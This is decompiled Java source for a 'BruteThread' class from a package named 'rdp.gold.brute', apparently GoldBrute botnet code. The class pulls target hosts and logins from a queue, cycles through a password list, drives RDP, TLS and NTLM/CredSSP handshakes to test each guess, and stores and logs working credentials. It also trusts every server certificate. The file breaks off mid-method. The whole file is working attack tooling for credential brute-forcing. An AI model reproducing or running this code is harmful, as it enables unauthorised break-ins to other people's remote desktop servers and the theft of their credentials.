/*      */ package rdp.gold.brute.pool;
/*      */ 
/*      */ import com.chilkatsoft.CkBinData;
/*      */ import com.chilkatsoft.CkByteData;
/*      */ import com.chilkatsoft.CkSocket;
/*      */ import com.chilkatsoft.CkString;
/*      */ import io.netty.bootstrap.Bootstrap;
/*      */ import io.netty.channel.ChannelFuture;
/*      */ import java.io.InputStream;
/*      */ import java.io.OutputStream;
/*      */ import java.io.PrintWriter;
/*      */ import java.io.StringWriter;
/*      */ import java.net.InetSocketAddress;
/*      */ import java.net.Socket;
/*      */ import java.util.ArrayList;
/*      */ import java.util.HashMap;
/*      */ import java.util.concurrent.atomic.AtomicBoolean;
/*      */ import java.util.concurrent.atomic.AtomicLong;
/*      */ import javax.net.SocketFactory;
/*      */ import javax.net.ssl.SSLContext;
/*      */ import javax.net.ssl.SSLSocket;
/*      */ import javax.net.ssl.SSLSocketFactory;
/*      */ import org.apache.log4j.Logger;
/*      */ import rdp.gold.brute.Config;
/*      */ import rdp.gold.brute.CounterPool;
/*      */ import rdp.gold.brute.RDPEntity;
/*      */ import rdp.gold.brute.rdp.ByteBuffer;
/*      */ import rdp.gold.brute.rdp.Messages.ClientNtlmsspNegotiate;
/*      */ import rdp.gold.brute.rdp.Messages.ClientNtlmsspPubKeyAuth;
/*      */ import rdp.gold.brute.rdp.Messages.ClientTpkt;
/*      */ import rdp.gold.brute.rdp.Messages.ClientX224ConnectionRequestPDU;
/*      */ import rdp.gold.brute.rdp.Messages.NtlmState;
/*      */ import rdp.gold.brute.rdp.Messages.ServerNtlmsspChallenge;
/*      */ import rdp.gold.brute.rdp.Messages.ServerNtlmsspPubKeyPlus1;
/*      */ import rdp.gold.brute.rdp.Messages.ServerTpkt;
/*      */ import rdp.gold.brute.rdp.Messages.ServerX224ConnectionConfirmPDU;
/*      */ import rdp.gold.brute.rdp.ssl.SSLState;
/*      */ import rdp.gold.brute.rdp.ssl.SSLUtils;
/*      */ 
/*      */ public class BruteThread implements Runnable
/*      */ {
/*   42 */   private static final Logger logger = Logger.getLogger(BruteThread.class);
/*   43 */   private HashMap<String, String> loginsDomain = new HashMap();
/*   44 */   private ArrayList<String> logins = new ArrayList();
/*      */   private String ip;
/*      */   private int port;
/*   47 */   private String domain = "";
/*   48 */   private java.util.UUID bruteId = Config.PROJECT_ID;
/*   49 */   private String domainCk = null;
/*   50 */   private String domainJre = null;
/*   51 */   private String domainConscrypt = null;
/*   52 */   private String domainApr = null;
/*   53 */   private String domainBco = null;
/*   54 */   private String domainNetty = null;
/*      */   
/*   56 */   private static io.netty.channel.nio.NioEventLoopGroup workerGroup = new io.netty.channel.nio.NioEventLoopGroup();
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*   79 */   public static long POOL_SOCKET = 0L;
/*      */   
/*      */ 
/*      */ 
/*      */   public void run()
/*      */   {
/*      */     try
/*      */     {
/*   87 */       String host = null;
/*      */       for (;;)
/*      */       {
/*   90 */         if ((!this.bruteId.equals(Config.PROJECT_ID)) || (!Config.IS_ENABLED_BRUTE.get())) {
/*   91 */           return;
/*      */         }
/*      */         
/*   94 */         boolean isRun = false;
/*      */         
/*   96 */         this.loginsDomain.clear();
/*   97 */         this.logins.clear();
/*      */         
/*   99 */         this.domainCk = null;
/*  100 */         this.domainJre = null;
/*  101 */         this.domainConscrypt = null;
/*  102 */         this.domainApr = null;
/*  103 */         this.domainBco = null;
/*  104 */         this.domainNetty = null;
/*      */         try
/*      */         {
/*  107 */           host = (String)GoldBrute.getTaskBruteQueue().poll();
/*      */           
/*  109 */           if (host != null) {
/*  110 */             if (host.contains(">>>")) {
/*  111 */               String ip = host.split(":")[0];
/*  112 */               int port = Integer.parseInt(host.split(":")[1].split(">>>")[0]);
/*  113 */               String[] loginsStr = host.split(">>>")[1].split(";");
/*      */               
/*  115 */               for (String login : loginsStr) {
/*  116 */                 String loginItem = login.contains("\\") ? login.split("\\\\")[1] : login;
/*  117 */                 String loginDomainItem = login.contains("\\") ? login.split("\\\\")[0] : "";
/*      */                 try
/*      */                 {
/*  120 */                   isRun = true;
/*  121 */                   CounterPool.poolUsed.incrementAndGet();
/*      */                   
/*  123 */                   boolean isValid = false;
/*      */                   
/*  125 */                   int cntPasswords = Config.PASSWORDS.size();
/*  126 */                   for (int c = 0; c < cntPasswords; c++) {
/*  127 */                     if ((!this.bruteId.equals(Config.PROJECT_ID)) || (!Config.IS_ENABLED_BRUTE.get())) {
/*  128 */                       return;
/*      */                     }
/*      */                     
/*  131 */                     String password = buildPassword(ip, loginItem, (String)Config.PASSWORDS.get(c));
/*      */                     
/*  133 */                     if (hasAccess(ip, port, loginDomainItem, loginItem, password)) {
/*  134 */                       rdp.gold.brute.ResultStorage.saveSuccess(ip + ":" + port, login, password);
/*      */                       
/*  136 */                       logger.info("RDP on host " + ip + ":" + port + " with login " + loginItem + " and password " + password + " is allow access");
/*  137 */                       CounterPool.countValid.incrementAndGet();
/*  138 */                       isValid = true;
/*      */                     }
/*      */                     
/*  141 */                     CounterPool.countCheckedCombinations.incrementAndGet();
/*      */                     
/*      */ 
/*  144 */                     if (!isValid) {
/*  145 */                       logger.info("RDP on host " + ip + ":" + port + " with login " + loginItem + " and password " + password + " is not allow access");
/*      */                     }
/*      */                   }
/*      */                 }
/*      */                 finally {
/*  150 */                   if (isRun == true) {
/*  151 */                     CounterPool.poolUsed.decrementAndGet();
/*      */                   }
/*      */                 }
/*      */               }
/*      */             } else {
/*  156 */               RDPEntity rdpEntity = RDPEntity.parse(host);
/*      */               
/*  158 */               if ((rdpEntity != null) && (rdpEntity.getLogin() != null) && (rdpEntity.getPassword() != null)) {
/*      */                 try {
/*  160 */                   isRun = true;
/*  161 */                   CounterPool.poolUsed.incrementAndGet();
/*  162 */                   boolean isValid = false;
/*      */                   
/*  164 */                   String ip = rdpEntity.getIp();
/*  165 */                   int port = rdpEntity.getPort();
/*  166 */                   String login = rdpEntity.getLogin();
/*  167 */                   String password = buildPassword(ip, login, rdpEntity.getPassword());
/*      */                   
/*  169 */                   boolean isValidCK = false;
/*  170 */                   boolean isValidJre = false;
/*  171 */                   boolean isValidConscrypt = false;
/*  172 */                   boolean isValidApr = false;
/*  173 */                   boolean isValidBco = false;
/*  174 */                   boolean isValidNetty = false;
/*      */                   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*  180 */                   if (hasAccessNetty(ip, port, "", login, password)) {
/*  181 */                     isValidNetty = true;
/*      */                   }
/*      */                   
/*  184 */                   String domain = null;
/*      */                   
/*  186 */                   if (this.domainCk != null) {
/*  187 */                     domain = this.domainCk;
/*  188 */                   } else if (this.domainJre != null) {
/*  189 */                     domain = this.domainJre;
/*  190 */                   } else if (this.domainConscrypt != null) {
/*  191 */                     domain = this.domainConscrypt;
/*  192 */                   } else if (this.domainApr != null) {
/*  193 */                     domain = this.domainApr;
/*  194 */                   } else if (this.domainBco != null) {
/*  195 */                     domain = this.domainBco;
/*  196 */                   } else if (this.domainNetty != null) {
/*  197 */                     domain = this.domainNetty;
/*      */                   }
/*      */                   
/*  200 */                   if (isValidNetty) {
/*  201 */                     if (domain != null) {
/*  202 */                       login = domain + "\\" + login;
/*      */                     }
/*      */                     
/*  205 */                     rdp.gold.brute.ResultStorage.saveSuccess(ip + ":" + port, login, password);
/*      */                     
/*  207 */                     logger.info("RDP on host " + ip + ":" + port + " with login " + login + " and password " + password + " is allow access");
/*  208 */                     CounterPool.countValid.incrementAndGet();
/*      */                     
/*  210 */                     isValid = true;
/*      */                   }
/*      */                   
/*  213 */                   CounterPool.countCheckedCombinations.incrementAndGet();
/*      */                   
/*      */ 
/*  216 */                   if (!isValid) {
/*  217 */                     logger.info("RDP on host " + ip + ":" + port + " with login " + login + " and password " + password + " is not allow access");
/*      */                   }
/*      */                 }
/*      */                 finally {
/*  221 */                   if (isRun == true) {
/*  222 */                     CounterPool.poolUsed.decrementAndGet();
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */                   }
/*      */                   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */                 }
/*      */                 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */               }
/*      */               
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */             }
/*      */             
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */           }
/*      */           
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */         }
/*      */         catch (Exception e)
/*      */         {
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*  313 */           StringWriter sw = new StringWriter();
/*  314 */           e.printStackTrace(new PrintWriter(sw));
/*      */           
/*  316 */           logger.error(e + " " + sw);
/*      */         }
/*      */         
/*  319 */         if (host == null) {
/*      */           try {
/*  321 */             Thread.sleep(200L);
/*      */           }
/*      */           catch (InterruptedException localInterruptedException) {}
/*      */         }
/*      */       }
/*      */       
/*      */ 
/*      */ 
/*      */       StringWriter sw;
/*      */       
/*      */ 
/*  332 */       return;
/*      */     }
/*      */     catch (Exception e)
/*      */     {
/*  327 */       sw = new StringWriter();
/*  328 */       e.printStackTrace(new PrintWriter(sw));
/*      */       
/*  330 */       logger.error(e + " " + sw);
/*      */     }
/*      */   }
/*      */   
/*      */   public boolean hasAccessCK(String host, int port, String domain, String login, String password) {
/*  335 */     Socket s = null;
/*  336 */     CkSocket socket = null;
/*      */     
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */     try
/*      */     {
/*  345 */       socket = new CkSocket();
/*      */       
/*      */ 
/*  348 */       boolean ssl = false;
/*      */       
/*  350 */       int maxWaitMillisec = Config.BRUTE_TIMEOUT.intValue();
/*  351 */       boolean success = socket.Connect(host, port, ssl, maxWaitMillisec);
/*  352 */       socket.put_DebugLogFilePath("C:\\Users\\London\\Documents\\Sync\\debug.log");
/*      */       
/*  354 */       if (success != true) {
/*  355 */         throw new RuntimeException(socket.lastErrorText());
/*      */       }
/*      */       
/*  358 */       socket.put_MaxReadIdleMs(Config.BRUTE_TIMEOUT.intValue());
/*  359 */       socket.put_MaxSendIdleMs(Config.BRUTE_TIMEOUT.intValue());
/*      */       
/*  361 */       ClientTpkt clientTpkt = new ClientTpkt();
/*  362 */       ClientX224ConnectionRequestPDU clientX224ConnectionRequestPDU = new ClientX224ConnectionRequestPDU(login, 2);
/*      */       
/*  364 */       ByteBuffer buffer = clientX224ConnectionRequestPDU.proccessPacket(null);
/*  365 */       clientTpkt.proccessPacket(buffer);
/*  366 */       buffer.rewindCursor();
/*      */       
/*  368 */       CkByteData ckByteData = new CkByteData();
/*  369 */       ckByteData.appendByteArray(buffer.data);
/*      */       
/*  371 */       CkBinData ckBinData = new CkBinData();
/*  372 */       ckBinData.AppendBinary(ckByteData);
/*      */       
/*  374 */       if (!socket.SendBd(ckBinData, buffer.offset, buffer.length)) {
/*  375 */         throw new RuntimeException(socket.lastErrorText());
/*      */       }
/*      */       
/*  378 */       ckByteData = new CkByteData();
/*  379 */       if (!socket.ReceiveBytes(ckByteData)) {
/*  380 */         throw new RuntimeException(socket.lastErrorText());
/*      */       }
/*      */       
/*  383 */       buffer = new ByteBuffer(-1);
/*  384 */       buffer.data = ckByteData.toByteArray();
/*  385 */       buffer.length = ckByteData.getSize();
/*  386 */       buffer.rewindCursor();
/*  387 */       buffer.ref();
/*      */       
/*  389 */       CounterPool.useBytes.addAndGet(buffer.length);
/*      */       
/*  391 */       ServerTpkt serverTpkt = new ServerTpkt();
/*  392 */       buffer = serverTpkt.proccessPacket(buffer);
/*      */       
/*  394 */       ServerX224ConnectionConfirmPDU serverX224ConnectionConfirmPDU = new ServerX224ConnectionConfirmPDU();
/*  395 */       serverX224ConnectionConfirmPDU.proccessPacket(buffer);
/*      */       
/*      */ 
/*  398 */       if (!socket.ConvertToSsl()) {
/*  399 */         throw new RuntimeException(socket.lastErrorText());
/*      */       }
/*      */       
/*  402 */       CkString ckString = new CkString();
/*  403 */       socket.get_TlsCipherSuite(ckString);
/*  404 */       logger.info("Cipher: " + ckString.getString());
/*      */       
/*  406 */       ckString = new CkString();
/*  407 */       socket.get_TlsVersion(ckString);
/*  408 */       logger.info("TlsVersion: " + ckString.getString());
/*      */       
/*  410 */       ckString = new CkString();
/*  411 */       socket.get_SslProtocol(ckString);
/*  412 */       logger.info("SslProtocol: " + ckString.getString());
/*      */       
/*  414 */       ckString = new CkString();
/*  415 */       socket.get_StringCharset(ckString);
/*  416 */       logger.info("StringCharset: " + ckString.getString());
/*      */       
/*  418 */       ckString = new CkString();
/*  419 */       socket.get_TlsCipherSuite(ckString);
/*  420 */       logger.info("TlsCipherSuite: " + ckString.getString());
/*      */       
/*  422 */       logger.info("SoRcvBuf: " + socket.get_SoRcvBuf());
/*  423 */       logger.info("SoSndBuf: " + socket.get_SoSndBuf());
/*      */       
/*  425 */       CkByteData outData = new CkByteData();
/*  426 */       socket.GetSslServerCert().ExportPublicKey().GetDer(false, outData);
/*      */       
/*  428 */       SSLState sslState = new SSLState();
/*  429 */       sslState.serverCertificateSubjectPublicKeyInfo = outData.toByteArray();
/*      */       
/*  431 */       NtlmState ntlmState = new NtlmState();
/*  432 */       ClientNtlmsspNegotiate clientNtlmsspNegotiate = new ClientNtlmsspNegotiate(ntlmState);
/*  433 */       buffer = clientNtlmsspNegotiate.proccessPacket(null);
/*  434 */       buffer.rewindCursor();
/*      */       
/*  436 */       ckByteData = new CkByteData();
/*  437 */       ckByteData.appendByteArray(buffer.data);
/*      */       
/*  439 */       ckBinData = new CkBinData();
/*  440 */       ckBinData.AppendBinary(ckByteData);
/*      */       
/*  442 */       if (!socket.SendBd(ckBinData, buffer.offset, buffer.length)) {
/*  443 */         throw new RuntimeException(socket.lastErrorText());
/*      */       }
/*      */       
/*  446 */       ckByteData = new CkByteData();
/*  447 */       if (!socket.ReceiveBytes(ckByteData)) {
/*  448 */         throw new RuntimeException(socket.lastErrorText());
/*      */       }
/*      */       
/*  451 */       buffer = new ByteBuffer(-1);
/*  452 */       buffer.data = ckByteData.toByteArray();
/*  453 */       buffer.length = ckByteData.getSize();
/*  454 */       buffer.rewindCursor();
/*  455 */       buffer.ref();
/*      */       
/*  457 */       CounterPool.useBytes.addAndGet(buffer.length);
/*      */       
/*  459 */       ServerNtlmsspChallenge serverNtlmsspChallenge = new ServerNtlmsspChallenge(ntlmState);
/*  460 */       serverNtlmsspChallenge.proccessPacket(buffer);
/*      */       
/*  462 */       this.domainCk = ntlmState.serverNetbiosDomainName;
/*      */       
/*  464 */       ClientNtlmsspPubKeyAuth clientNtlmsspPubKeyAuth = new ClientNtlmsspPubKeyAuth(ntlmState, sslState, host, "", "workstation", login, password);
/*      */       
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*  474 */       buffer = clientNtlmsspPubKeyAuth.proccessPacket(null);
/*  475 */       buffer.rewindCursor();
/*      */       
/*  477 */       ckByteData = new CkByteData();
/*  478 */       ckByteData.appendByteArray(buffer.data);
/*      */       
/*  480 */       ckBinData = new CkBinData();
/*  481 */       ckBinData.AppendBinary(ckByteData);
/*      */       
/*  483 */       if (!socket.SendBd(ckBinData, buffer.offset, buffer.length)) {
/*  484 */         throw new RuntimeException(socket.lastErrorText());
/*      */       }
/*      */       
/*  487 */       ckByteData = new CkByteData();
/*  488 */       if (!socket.ReceiveBytes(ckByteData)) {
/*  489 */         throw new RuntimeException(socket.lastErrorText());
/*      */       }
/*      */       
/*  492 */       buffer = new ByteBuffer(-1);
/*  493 */       buffer.data = ckByteData.toByteArray();
/*  494 */       buffer.length = ckByteData.getSize();
/*  495 */       buffer.rewindCursor();
/*  496 */       buffer.ref();
/*      */       
/*  498 */       CounterPool.useBytes.addAndGet(buffer.length);
/*      */       
/*  500 */       ServerNtlmsspPubKeyPlus1 serverNtlmsspPubKeyPlus1 = new ServerNtlmsspPubKeyPlus1(ntlmState);
/*  501 */       serverNtlmsspPubKeyPlus1.proccessPacket(buffer);
/*      */       
/*  503 */       return true;
/*      */     } catch (Exception e) {
/*  505 */       StringWriter sw = new StringWriter();
/*  506 */       e.printStackTrace(new PrintWriter(sw));
/*      */       
/*  508 */       logger.error(e + " " + sw);
/*      */     } finally {
/*      */       try {
/*  511 */         if ((s != null) && (!s.isClosed())) {
/*  512 */           s.close();
/*      */         }
/*      */       } catch (Exception exception) {
/*  515 */         logger.error(exception);
/*      */       }
/*      */       try
/*      */       {
/*  519 */         if ((socket != null) && (socket.get_IsConnected())) {
/*  520 */           socket.Close(1000);
/*      */         }
/*      */       } catch (Exception exception) {
/*  523 */         logger.error(exception);
/*      */       }
/*      */     }
/*      */     
/*  527 */     return false;
/*      */   }
/*      */   
/*      */   public boolean hasAccessNetty(String host, int port, String domain, String login, String password) {
/*  531 */     AtomicBoolean isValid = new AtomicBoolean(false);
/*  532 */     StringBuilder getDomain = new StringBuilder();
/*      */     try
/*      */     {
/*  535 */       Bootstrap b = new Bootstrap();
/*  536 */       b.group(workerGroup);
/*  537 */       b.channel(io.netty.channel.socket.nio.NioSocketChannel.class);
/*  538 */       b.option(io.netty.channel.ChannelOption.SO_KEEPALIVE, Boolean.valueOf(false));
/*  539 */       b.option(io.netty.channel.ChannelOption.TCP_NODELAY, Boolean.valueOf(true));
/*  540 */       b.option(io.netty.channel.ChannelOption.CONNECT_TIMEOUT_MILLIS, Config.BRUTE_TIMEOUT);
/*      */       
/*  542 */       b.handler(new rdp.gold.brute.netty.ProtocolInitializer(host, port, domain, login, password, isValid, getDomain));
/*  543 */       ChannelFuture channelFuture = b.connect(host, port).sync();
/*      */       
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*  549 */       channelFuture.channel().closeFuture().sync();
/*      */ 
/*      */     }
/*      */     catch (Exception e)
/*      */     {
/*  554 */       logger.info(e);
/*      */ 
/*      */     }
/*      */     finally
/*      */     {
/*      */ 
/*  560 */       this.domainNetty = getDomain.toString();
/*      */     }
/*      */     
/*      */ 
/*  564 */     return isValid.get();
/*      */   }
/*      */   
/*      */   public boolean isCredSsp(String host, int port) {
/*  568 */     Socket socket = null;
/*      */     try
/*      */     {
/*  571 */       InetSocketAddress address = new InetSocketAddress(host, port);
/*      */       
/*      */ 
/*  574 */       long startTime = System.currentTimeMillis();
/*      */       
/*  576 */       socket = SocketFactory.getDefault().createSocket();
/*  577 */       socket.connect(address, Config.BRUTE_TIMEOUT.intValue());
/*  578 */       socket.setSoTimeout(Config.BRUTE_TIMEOUT.intValue());
/*      */       
/*  580 */       InputStream inputStream = socket.getInputStream();
/*  581 */       OutputStream outputStream = socket.getOutputStream();
/*      */       
/*  583 */       ClientTpkt clientTpkt = new ClientTpkt();
/*  584 */       ClientX224ConnectionRequestPDU clientX224ConnectionRequestPDU = new ClientX224ConnectionRequestPDU("Admin", 2);
/*      */       
/*  586 */       ByteBuffer buffer = clientX224ConnectionRequestPDU.proccessPacket(null);
/*  587 */       clientTpkt.proccessPacket(buffer);
/*  588 */       buffer.rewindCursor();
/*      */       
/*  590 */       outputStream.write(buffer.data, buffer.offset, buffer.length);
/*  591 */       outputStream.flush();
/*      */       
/*  593 */       buffer = new ByteBuffer(-1);
/*  594 */       int actualLength = inputStream.read(buffer.data, buffer.offset, buffer.data.length - buffer.offset);
/*      */       
/*  596 */       if (actualLength <= 0) {
/*  597 */         throw new Exception("INFO: End of stream or empty buffer is read from stream.");
/*      */       }
/*      */       
/*  600 */       buffer.length = actualLength;
/*  601 */       buffer.rewindCursor();
/*  602 */       buffer.ref();
/*      */       
/*  604 */       ServerTpkt serverTpkt = new ServerTpkt();
/*  605 */       buffer = serverTpkt.proccessPacket(buffer);
/*      */       
/*  607 */       ServerX224ConnectionConfirmPDU serverX224ConnectionConfirmPDU = new ServerX224ConnectionConfirmPDU();
/*  608 */       serverX224ConnectionConfirmPDU.proccessPacket(buffer);
/*      */       
/*      */ 
/*  611 */       SSLState sslState = new SSLState();
/*      */       
/*  613 */       SSLContext sslContext = SSLUtils.getSSLContext();
/*  614 */       sslContext.init(null, new javax.net.ssl.TrustManager[] { new rdp.gold.brute.rdp.ssl.TrustAllX509TrustManager(sslState) }, null);
/*      */       
/*  616 */       long elapsedTime = System.currentTimeMillis() - startTime;
/*      */       
/*  618 */       SSLSocketFactory sslSocketFactory = new rdp.gold.brute.rdp.ssl.SecureSSLSocketFactory(sslContext);
/*      */       
/*  620 */       SSLSocket sslSocket = (SSLSocket)sslSocketFactory.createSocket(socket, address.getHostName(), address.getPort(), true);
/*  621 */       sslSocket.setEnabledProtocols(SSLUtils.getSupportedProtocols(sslSocket.getEnabledProtocols()));
/*      */       
/*  623 */       sslSocket.setSoTimeout(new Long(Config.BRUTE_TIMEOUT.intValue() - elapsedTime).intValue());
/*  624 */       sslSocket.startHandshake();
/*      */       
/*  626 */       InputStream sslSocketInputStream = sslSocket.getInputStream();
/*  627 */       OutputStream sslSocketOutputStream = sslSocket.getOutputStream();
/*      */       
/*  629 */       NtlmState ntlmState = new NtlmState();
/*  630 */       ClientNtlmsspNegotiate clientNtlmsspNegotiate = new ClientNtlmsspNegotiate(ntlmState);
/*  631 */       buffer = clientNtlmsspNegotiate.proccessPacket(null);
/*  632 */       buffer.rewindCursor();
/*      */       
/*  634 */       sslSocketOutputStream.write(buffer.data, buffer.offset, buffer.length);
/*  635 */       sslSocketOutputStream.flush();
/*      */       
/*  637 */       buffer = new ByteBuffer(-1);
/*      */       
/*  639 */       actualLength = sslSocketInputStream.read(buffer.data, buffer.offset, buffer.data.length - buffer.offset);
/*      */       
/*  641 */       if (actualLength <= 0) {
/*  642 */         throw new Exception("INFO: End of stream or empty buffer is read from stream.");
/*      */       }
/*      */       
/*  645 */       buffer.length = actualLength;
/*  646 */       buffer.rewindCursor();
/*  647 */       buffer.ref();
/*      */       
/*  649 */       ServerNtlmsspChallenge serverNtlmsspChallenge = new ServerNtlmsspChallenge(ntlmState);
/*  650 */       serverNtlmsspChallenge.proccessPacket(buffer);
/*      */       
/*  652 */       return true;
/*      */     } catch (Exception e) {
/*  654 */       logger.error(e);
/*      */     } finally {
/*      */       try {
/*  657 */         socket.close();
/*      */       } catch (Exception e) {
/*  659 */         logger.error(e);
/*      */       }
/*      */     }
/*      */     
/*  663 */     return false;
/*      */   }
/*      */   
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */   public boolean hasAccess(String host, int port, String domain, String login, String password)
/*      */   {
/*  826 */     Socket socket = null;
/*      */     try
/*      */     {
/*  829 */       InetSocketAddress address = new InetSocketAddress(host, port);
/*      */       
/*      */ 
/*  832 */       long startTime = System.currentTimeMillis();
/*      */       
/*  834 */       socket = SocketFactory.getDefault().createSocket();
/*  835 */       socket.connect(address, Config.BRUTE_TIMEOUT.intValue());
/*  836 */       socket.setSoTimeout(Config.BRUTE_TIMEOUT.intValue());
/*      */       
/*  838 */       InputStream inputStream = socket.getInputStream();
/*  839 */       OutputStream outputStream = socket.getOutputStream();
/*      */       
/*  841 */       ClientTpkt clientTpkt = new ClientTpkt();
/*  842 */       ClientX224ConnectionRequestPDU clientX224ConnectionRequestPDU = new ClientX224ConnectionRequestPDU(login, 2);
/*      */       
/*  844 */       ByteBuffer buffer = clientX224ConnectionRequestPDU.proccessPacket(null);
/*  845 */       clientTpkt.proccessPacket(buffer);
/*  846 */       buffer.rewindCursor();
/*      */       
/*  848 */       outputStream.write(buffer.data, buffer.offset, buffer.length);
/*  849 */       outputStream.flush();
/*      */       
/*  851 */       buffer = new ByteBuffer(-1);
/*  852 */       int actualLength = inputStream.read(buffer.data, buffer.offset, buffer.data.length - buffer.offset);
/*      */       
/*  854 */       if (actualLength <= 0) {
/*  855 */         throw new Exception("INFO: End of stream or empty buffer is read from stream.");
/*      */       }
/*      */       
/*  858 */       buffer.length = actualLength;
/*  859 */       buffer.rewindCursor();
/*  860 */       buffer.ref();
/*      */       
/*  862 */       CounterPool.useBytes.addAndGet(actualLength);
/*      */       
/*  864 */       ServerTpkt serverTpkt = new ServerTpkt();
/*  865 */       buffer = serverTpkt.proccessPacket(buffer);
/*      */       
/*  867 */       ServerX224ConnectionConfirmPDU serverX224ConnectionConfirmPDU = new ServerX224ConnectionConfirmPDU();
/*  868 */       serverX224ConnectionConfirmPDU.proccessPacket(buffer);
/*      */       
/*      */ 
/*  871 */       SSLState sslState = new SSLState();
/*      */       
/*  873 */       SSLContext sslContext = SSLUtils.getSSLContext();
/*  874 */       sslContext.init(null, new javax.net.ssl.TrustManager[] { new rdp.gold.brute.rdp.ssl.TrustAllX509TrustManager(sslState) }, null);
/*      */       
/*  876 */       long elapsedTime = System.currentTimeMillis() - startTime;
/*      */       
/*  878 */       SSLSocketFactory sslSocketFactory = new rdp.gold.brute.rdp.ssl.SecureSSLSocketFactory(sslContext);
/*      */       
/*  880 */       SSLSocket sslSocket = (SSLSocket)sslSocketFactory.createSocket(socket, address.getHostName(), address.getPort(), true);
/*  881 */       sslSocket.setEnabledProtocols(SSLUtils.getSupportedProtocols(sslSocket.getEnabledProtocols()));
/*      */       
/*  883 */       sslSocket.setSoTimeout(new Long(Config.BRUTE_TIMEOUT.intValue() - elapsedTime).intValue());
/*  884 */       sslSocket.startHandshake();
/*      */       
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*  890 */       logger.info("TLS: " + sslSocket.getSession());
/*  891 */       logger.info("TLS protocol: " + sslSocket.getSession().getProtocol());
/*      */       
/*  893 */       logger.info("getSessionCacheSize: " + sslSocket.getSession().getSessionContext().getSessionCacheSize());
/*  894 */       logger.info("getSessionTimeout: " + sslSocket.getSession().getSessionContext().getSessionTimeout());
/*      */       
/*  896 */       sslSocket.setReceiveBufferSize(4194304);
/*  897 */       sslSocket.setSendBufferSize(262144);
/*      */       
/*  899 */       logger.info("ReceiveBufferSize: " + sslSocket.getReceiveBufferSize());
/*  900 */       logger.info("SendBufferSize: " + sslSocket.getSendBufferSize());
/*      */       
/*      */ 
/*  903 */       InputStream sslSocketInputStream = sslSocket.getInputStream();
/*  904 */       OutputStream sslSocketOutputStream = sslSocket.getOutputStream();
/*      */       
/*  906 */       NtlmState ntlmState = new NtlmState();
/*  907 */       ClientNtlmsspNegotiate clientNtlmsspNegotiate = new ClientNtlmsspNegotiate(ntlmState);
/*  908 */       buffer = clientNtlmsspNegotiate.proccessPacket(null);
/*  909 */       buffer.rewindCursor();
/*      */       
/*  911 */       sslSocketOutputStream.write(buffer.data, buffer.offset, buffer.length);
/*  912 */       sslSocketOutputStream.flush();
/*      */       
/*  914 */       buffer = new ByteBuffer(-1);
/*      */       
/*  916 */       actualLength = sslSocketInputStream.read(buffer.data, buffer.offset, buffer.data.length - buffer.offset);
/*      */       
/*  918 */       if (actualLength <= 0) {
